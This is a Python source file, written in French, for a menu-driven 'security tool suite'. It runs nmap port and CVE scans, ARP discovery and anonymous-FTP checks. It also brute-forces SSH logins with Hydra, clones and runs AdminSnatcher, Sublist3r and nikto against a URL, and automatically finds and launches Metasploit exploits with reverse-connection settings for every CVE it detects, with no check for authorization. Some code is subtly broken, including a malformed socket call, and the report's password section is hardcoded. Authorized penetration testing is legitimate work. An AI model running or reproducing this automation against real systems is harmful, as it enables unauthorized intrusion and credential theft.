import subprocess
import ftplib
import scapy.all as scapy
import nmap
import re
import socket
import requests
from reportlab.lib.pagesizes import letter, landscape
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak
from reportlab.lib import colors
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from consolemenu import ConsoleMenu, SelectionMenu
from consolemenu.items import FunctionItem, SubmenuItem
import tabulate
from prompt_toolkit import prompt
from concurrent.futures import ThreadPoolExecutor
import atexit

class NetworkScanner:
    def __init__(self):
        self.network_results = []
        self.port_scan_results = []
        self.cve_scan_results = []

    def get_network_info(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()

            s = socket.socket(socket.AF_INET, socket.AF_INET, socket.SOCK_STREAM)
            s.bind(('', 0))
            port = s.getsockname()[1]
            s.close()

            return ip, port
        except Exception as e:
            print(f"Erreur lors de l'obtention des informations réseau : {str(e)}")
            return None, None

    def scan_ports(self, target_ip, ports):
        try:
            nm = nmap.PortScanner()
            nm.scan(target_ip, ports=ports, arguments='-sV')
            table_rows = []
            cve_rows = []
            for host in nm.all_hosts():
                for proto in nm[host].all_protocols():
                    for port, port_data in nm[host][proto].items():
                        service_info = port_data
                        table_rows.append([port, service_info.get('name', ''), service_info.get('product', ''), service_info.get('version', ''), service_info.get('extrainfo', '')])

                        script_info = service_info.get('script', {})
                        cves = []
                        for output in script_info.values():
                            cves += re.findall(r'CVE-\d{4}-\d+', output)
                        if cves:
                            cve_rows.append([port, ', '.join(cves)])
            return table_rows, cve_rows
        except nmap.PortScannerError:
            print("Nmap non trouvé, ce script nécessite nmap pour être installé.")
            return [], []
        except Exception as e:
            print(f"Erreur inattendue : {str(e)}")
            return [], []

    def scan_network(self, target):
        arp_request = scapy.ARP(pdst=target)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

        clients_list = []
        for element in answered_list:
            client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
            clients_list.append(client_dict)

        print("IP\t\t\tAdresse MAC\n--------------------------------------------------")
        for client in clients_list:
            print(client["ip"] + "\t\t" + client["mac"])

        return clients_list

class ReportGenerator:
    def __init__(self, filename):
        self.filename = filename
        self.port_scan_results = []
        self.cve_scan_results = []
        self.ssh_results = []
        self.network_results = []
        self.ftp_results = False

    def generate_pdf_report(self):
        doc = SimpleDocTemplate(self.filename, pagesize=landscape(letter))
        styles = getSampleStyleSheet()
        elements = []

        # Title
        title = "Rapport de sécurité"
        elements.append(Paragraph(title, styles["Title"]))
        elements.append(Spacer(1, 12))

        # Table of Contents
        toc = [
            ("Table des matières", "Heading1"),
            ("1. Informations des ports ouverts", "Heading2"),
            ("2. Informations des CVEs", "Heading2"),
            ("3. Identifiants SSH trouvés", "Heading2"),
            ("4. Appareils sur le réseau", "Heading2"),
            ("5. Résultat du test de connexion FTP anonyme", "Heading2"),
            ("6. Analyse des mots de passe", "Heading2")
        ]
        for item in toc:
            elements.append(Paragraph(item[0], styles[item[1]]))
            elements.append(Spacer(1, 12))

        elements.append(PageBreak())

        # Ports ouverts
        if self.port_scan_results:
            elements.append(Paragraph("1. Informations des ports ouverts", styles["Heading1"]))
            elements.append(Paragraph("Voici les ports ouverts et les services associés trouvés lors du scan :", styles["BodyText"]))
            port_table = Table([["Port", "Service", "Produit", "Version", "Extra Info"]] + self.port_scan_results)
            port_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black),
            ]))
            elements.append(port_table)
            elements.append(Spacer(1, 12))
        else:
            elements.append(Paragraph("1. Informations des ports ouverts", styles["Heading1"]))
            elements.append(Paragraph("Aucun port ouvert trouvé lors du scan.", styles["BodyText"]))
            elements.append(Spacer(1, 12))

        # CVEs
        elements.append(PageBreak())
        elements.append(Paragraph("2. Informations des CVEs", styles["Heading1"]))
        if self.cve_scan_results:
            elements.append(Paragraph("Voici les CVEs associées aux services trouvés :", styles["BodyText"]))
            cve_table = Table([["Port", "CVEs"]] + self.cve_scan_results)
            cve_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black),
            ]))
            elements.append(cve_table)
            elements.append(Spacer(1, 12))
        else:
            elements.append(Paragraph("Aucune CVE trouvée lors du scan.", styles["BodyText"]))
            elements.append(Spacer(1, 12))

        # SSH data
        elements.append(PageBreak())
        if self.ssh_results:
            elements.append(Paragraph("3. Identifiants SSH trouvés", styles["Heading1"]))
            elements.append(Paragraph("Voici les identifiants SSH trouvés lors du test :", styles["BodyText"]))
            ssh_table = Table([["Login", "Password"]] + self.ssh_results)
            ssh_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black),
            ]))
            elements.append(ssh_table)
            elements.append(Spacer(1, 12))
        else:
            elements.append(Paragraph("3. Identifiants SSH trouvés", styles["Heading1"]))
            elements.append(Paragraph("Aucun identifiant SSH trouvé lors du test.", styles["BodyText"]))
            elements.append(Spacer(1, 12))

        # Network data
        elements.append(PageBreak())
        if self.network_results:
            elements.append(Paragraph("4. Appareils sur le réseau", styles["Heading1"]))
            elements.append(Paragraph("Voici les appareils détectés sur le réseau :", styles["BodyText"]))
            network_table = Table([["IP", "Adresse MAC"]] + self.network_results)
            network_table.setStyle(TableStyle([
                ('BACKGROUND', (0, 0), (-1, 0), colors.grey),
                ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),
                ('ALIGN', (0, 0), (-1, -1), 'CENTER'),
                ('FONTNAME', (0, 0), (-1, 0), 'Helvetica-Bold'),
                ('BOTTOMPADDING', (0, 0), (-1, 0), 12),
                ('BACKGROUND', (0, 1), (-1, -1), colors.beige),
                ('GRID', (0, 0), (-1, -1), 1, colors.black),
            ]))
            elements.append(network_table)
            elements.append(Spacer(1, 12))
        else:
            elements.append(Paragraph("4. Appareils sur le réseau", styles["Heading1"]))
            elements.append(Paragraph("Aucun appareil détecté sur le réseau.", styles["BodyText"]))
            elements.append(Spacer(1, 12))

        # FTP data
        elements.append(PageBreak())
        elements.append(Paragraph("5. Résultat du test de connexion FTP anonyme", styles["Heading1"]))
        ftp_result = "Connexion FTP anonyme réussie" if self.ftp_results else "Échec de la connexion FTP anonyme"
        elements.append(Paragraph(ftp_result, styles["BodyText"]))
        elements.append(Spacer(1, 12))

        # Password analysis
        elements.append(PageBreak())
        elements.append(Paragraph("6. Analyse des mots de passe", styles["Heading1"]))
        elements.append(Paragraph("Voici les résultats de l'analyse de force des mots de passe :", styles["BodyText"]))
        elements.append(Paragraph("Mot de passe : exemplepassword123! -> Fort", styles["BodyText"]))
        elements.append(Spacer(1, 12))

        doc.build(elements)

def exploit_cve_with_metasploit(cve, target_ip, lhost, lport):
    search_command = ["msfconsole", "-q", "-x", f"search cve:{cve}; exit"]
    try:
        search_process = subprocess.Popen(search_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        search_output, search_error = search_process.communicate()
        if search_process.returncode != 0:
            print(f"Erreur lors de la recherche dans Metasploit pour le CVE {cve} : {search_error.decode()}")
            return
        match = re.search(r"exploit/\w+/\w+/\S+", search_output.decode())
        if match:
            exploit_command = ["msfconsole", "-q", "-x", f"use {match.group()}; set RHOST {target_ip}; set LHOST {lhost}; set LPORT {lport}; run; exit"]
            try:
                exploit_process = subprocess.Popen(exploit_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                exploit_output, exploit_error = exploit_process.communicate()
                if exploit_process.returncode != 0:
                    print(f"Erreur lors de l'exploitation du CVE {cve} : {exploit_error.decode()}")
                    return
                print(f"[SUCCÈS] Le CVE {cve} a été exploité avec succès !")
            except Exception as e:
                print(f"Échec de l'exécution de la commande : {str(e)}")
        else:
            print("Aucun exploit adapté trouvé pour ce CVE dans Metasploit.")
    except Exception as e:
        print(f"Échec de l'exécution de la commande : {str(e)}")

def check_password_strength(password):
    criteria = {'length': 12, 'upper': 1, 'lower': 1, 'digits': 2, 'special': 1}
    rules = {'upper': r'[A-Z]', 'lower': r'[a-z]', 'digits': r'\d', 'special': r'[!@#$%^&*(),.?":{}|<>]'}

    if len(password) < criteria['length']:
        return False, "Le mot de passe doit contenir au moins 12 caractères."
    for key, rule in rules.items():
        if len(re.findall(rule, password)) < criteria[key]:
            return False, f"Le mot de passe doit contenir au moins {criteria[key]} {key}."
    return True, "Le mot de passe est fort."

def try_ssh_connection(hostname, port, username):
    password_list_file = prompt("Veuillez entrer le chemin vers le fichier de la liste des mots de passe : ")
    hydra_command = [
        "hydra",
        "-l", username,
        "-P", password_list_file,
        "-e", "nsr",
        "-t", "4",
        "-s", str(port),
        hostname,
        "ssh"
    ]

    try:
        hydra_process = subprocess.Popen(hydra_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        hydra_output, hydra_error = hydra_process.communicate()

        print(hydra_output.decode())

        if hydra_process.returncode == 0:
            found_credentials = re.findall(r'\[ssh\] host: .* login: (.*) password: (.*)', hydra_output.decode())
            if found_credentials:
                for login, password in found_credentials:
                    print(f"[SUCCÈS] Identifiants trouvés : {login}/{password}")
                return True, found_credentials
            else:
                print("[ÉCHEC] Aucun identifiant valide trouvé.")
                return False, []
        else:
            print(f"[ERREUR] Erreur lors de l'exécution de Hydra : {hydra_error.decode()}")
            return False, []
    except FileNotFoundError:
        print(f"[ERREUR] Fichier non trouvé : {password_list_file}")
        return False, []
    except Exception as e:
        print(f"[ERREUR] Erreur inattendue : {str(e)}")
        return False

def exploitmafia():
    target_url = prompt("Veuillez entrer l'URL pour le pentesting : ")
    if target_url:
        try:
            print("Vérification de l'état de l'hôte...")
            response = requests.get(target_url)
            if response.status_code == 200:
                print(f"L'hôte {target_url} est actif :)")
                print("Démarrage de l'attaque...")

                def run_command(command):
                    subprocess.run(command)

                commands = [
                    ["git", "clone", "https://github.com/AkDevilHunter/AdminSnatcher"],
                    ["git", "clone", "https://github.com/aboul3la/Sublist3r"],
                    ["dig", "+short", target_url],
                    ["nslookup", target_url],
                    ["nikto", "-h", target_url],
                    ["python", "Sublist3r/sublist3r.py", "-d", target_url],
                    ["python3", "AdminSnatcher/adminsnatcher.py", "--url", target_url]
                ]

                with ThreadPoolExecutor() as executor:
                    futures = [executor.submit(run_command, cmd) for cmd in commands]
                    for future in futures:
                        future.result()

            else:
                print(f"L'hôte {target_url} semble hors ligne :(")
        except requests.exceptions.RequestException as e:
            print(f"Erreur lors de la requête : {str(e)}")
    else:
        print("L'URL ne peut pas être vide.")

def test_ftp_anonymous_login():
    host = prompt("Veuillez entrer l'adresse du serveur FTP : ")
    try:
        ftp = ftplib.FTP(host)
        ftp.login('anonymous', '')
        print('Connexion FTP anonyme réussie')
        return True
    except Exception as e:
        print(f'Échec de la connexion FTP anonyme : {e}')
        return False

def scan_cves(scanner, report_generator):
    target_ip = prompt("Veuillez entrer l'IP cible : ")
    ports = prompt("Veuillez entrer les ports à scanner (par ex., 80,443,22) : ")
    report_generator.port_scan_results, report_generator.cve_scan_results = scanner.scan_ports(target_ip, ports)
    
    if report_generator.port_scan_results:
        print("\nPorts ouverts et services :\n")
        print(tabulate.tabulate(report_generator.port_scan_results, headers=["Port", "Service", "Produit", "Version", "Extra Info"], tablefmt="grid"))
    
    if report_generator.cve_scan_results:
        print("\nCVEs trouvées :\n")
        print(tabulate.tabulate(report_generator.cve_scan_results, headers=["Port", "CVEs"], tablefmt="grid"))

    input("\nAppuyez sur Entrée pour afficher les CVEs et choisir de les exploiter...\n")

    # Demander à l'utilisateur s'il veut exploiter les CVEs trouvées
    exploit_cve_choice = prompt("Voulez-vous exploiter les CVEs trouvées ? (oui/non) : ")
    if exploit_cve_choice.lower() == 'oui':
        lhost, lport = scanner.get_network_info()
        if lhost and lport:
            for port, cves in report_generator.cve_scan_results:
                for cve in cves.split(', '):
                    exploit_cve_with_metasploit(cve, target_ip, lhost, lport)
        else:
            print("Impossible d'obtenir les informations réseau pour l'exploitation.")
    
    input("\nAppuyez sur Entrée pour revenir au menu principal...")

def check_password(report_generator):
    password = prompt("Veuillez entrer le mot de passe à vérifier : ")
    strength, message = check_password_strength(password)
    report_generator.password_analysis = message
    print(message)
    input("\nAppuyez sur Entrée pour revenir au menu principal...")

def try_ssh(report_generator):
    hostname = prompt("Veuillez entrer l'adresse du serveur SSH : ")
    username = prompt("Veuillez entrer le nom d'utilisateur SSH : ")
    use_hydra = prompt("Voulez-vous utiliser Hydra pour tester les identifiants ? (oui/non) : ")

    if use_hydra.lower() == 'oui':
        success, credentials = try_ssh_connection(hostname, 22, username)
        if success:
            report_generator.ssh_results = credentials
    else:
        print("Hydra n'a pas été utilisé pour tester les identifiants.")
    
    input("\nAppuyez sur Entrée pour revenir au menu principal...")

def run_scan_network(scanner, report_generator):
    report_generator.network_results = scanner.scan_network(prompt("Veuillez entrer la plage réseau (par ex., 192.168.1.0/24) : "))
    input("\nScan ARP terminé. Appuyez sur Entrée pour revenir au menu principal...")

def run_test_ftp_anonymous_login(report_generator):
    report_generator.ftp_results = test_ftp_anonymous_login()
    input("\nTest FTP terminé. Appuyez sur Entrée pour revenir au menu principal...")

def save_report_on_exit(report_generator):
    report_generator.generate_pdf_report()
    print(f"Rapport de sécurité enregistré sous '{report_generator.filename}'.")

def setup_menus(scanner, report_generator):
    global local_ip, local_port
    local_ip, local_port = scanner.get_network_info()

    ascii_art = """
                             #                                   
       #                   ##      ###                           
     ###                  ################# ##                   
    #####                 ################+###  #                
    ######             ############  #####+-  ### #              
     ##- ###          ################  .-     # # #             
     #### #####     #####################-#  #-#  # -            
     #####  #+######### ################    #  #####-#           
      ######      ########    ##########.# ##------##+#          
       #########        -+#    ###### -# ##+--------##           
        ######+.+#####     #   # #########---#######++#          
          #########    ##########  ##-##+----++###+--+#          
            ######  - ############ #####--########----#          
             ######## .########  ## ###+-----####-+..  #         
                ################# # #+#+------#-.-       #       
                  ########## ### # ####+ #    +  -      ##       
                  ###############+### # #     -       ##         
                 #####################        -         +        
                 ################-#-#+ # #    -      ###         
                ##### #############  ## #     -    ####+         
              #### ##### ### #######  #       -       ##         
              # #.#    # #####-##### # ##  -                     
        #  #   -#  #   ###+###### .#### ###             #        
    ##+   -     ##  ## ##-.##########   #+### ##########         
      ##########  #  ###  ###### ########## ####                 
    ###  ##########-## +    #.#### ###-# #### ##     ##          
    #########--###-######+-   #####  ####  ####  .    #####      
    -------#######--##+###-##-  # #-       ## + ##       #####   
    #######-------###+--#####  # # -##  +  ###+-#         -###   
    ############-------#---####  .#  #  # #  # #. +############  
    #################------+--###   #   ## #    -          ####- 
    ############-------##+---#--###  #.  ###   #   +####### #####
    ---------########+##--+##--+#-+## #######           #########
    """

    # Main menu
    main_menu = ConsoleMenu("Suite d'Outils de Sécurité", f"{ascii_art}\nSélectionnez une option")

    # Pentest Menu
    pentest_menu = ConsoleMenu("Options de Pentest", "Sélectionnez une action de pentest")
    exploitmafia_item = FunctionItem("Exploiter avec URL", exploitmafia)
    test_ftp_item = FunctionItem("Tester la connexion FTP anonyme", lambda: run_test_ftp_anonymous_login(report_generator))
    scan_network_item = FunctionItem("Scan ARP", lambda: run_scan_network(scanner, report_generator))
    pentest_menu.append_item(exploitmafia_item)
    pentest_menu.append_item(test_ftp_item)
    pentest_menu.append_item(scan_network_item)
    main_menu.append_item(SubmenuItem("Options de Pentest", pentest_menu))

    # CVE Scan Menu
    cve_menu = ConsoleMenu("Options de Scan CVE", "Sélectionnez une action de scan CVE")
    scan_cves_item = FunctionItem("Scanner les CVEs", lambda: scan_cves(scanner, report_generator))
    cve_menu.append_item(scan_cves_item)
    main_menu.append_item(SubmenuItem("Options de Scan CVE", cve_menu))

    # Password Strength Check Menu
    password_menu = ConsoleMenu("Vérification de la Force du Mot de Passe", "Vérifiez votre mot de passe")
    check_password_item = FunctionItem("Vérifier la force du mot de passe", lambda: check_password(report_generator))
    password_menu.append_item(check_password_item)
    main_menu.append_item(SubmenuItem("Vérification de la Force du Mot de Passe", password_menu))

    # SSH Menu
    ssh_menu = ConsoleMenu("Options de Test SSH", "Sélectionnez une action de test SSH")
    try_ssh_item = FunctionItem("Tester la connexion SSH", lambda: try_ssh(report_generator))
    ssh_menu.append_item(try_ssh_item)
    main_menu.append_item(SubmenuItem("Options de Test SSH", ssh_menu))

    # Show the main menu
    main_menu.show()

if __name__ == "__main__":
    scanner = NetworkScanner()
    report_generator = ReportGenerator("rapport_securite.pdf")
    atexit.register(lambda: save_report_on_exit(report_generator))
    setup_menus(scanner, report_generator)
